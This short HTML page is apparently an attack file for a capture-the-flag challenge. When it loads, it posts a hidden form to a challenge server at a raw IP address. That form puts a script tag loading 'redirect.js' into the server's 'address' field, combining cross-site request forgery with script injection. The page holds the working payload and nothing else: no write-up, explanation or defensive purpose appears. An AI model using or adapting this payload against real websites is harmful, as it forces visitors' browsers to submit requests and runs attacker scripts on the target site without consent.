<html>
<head>
<style>
.xss {display: none;
}
</style>
</head>
<body onload="XSS.submit();">
<form id="" action="http://34.126.112.172/chall_01/index.php" method="post" name="XSS">
<input name="target" value ="all"></input>
<input name="address" value="<SCRIPT SRC='./redirect.js'></SCRIPT>"</input>
</form>
</body>
</html>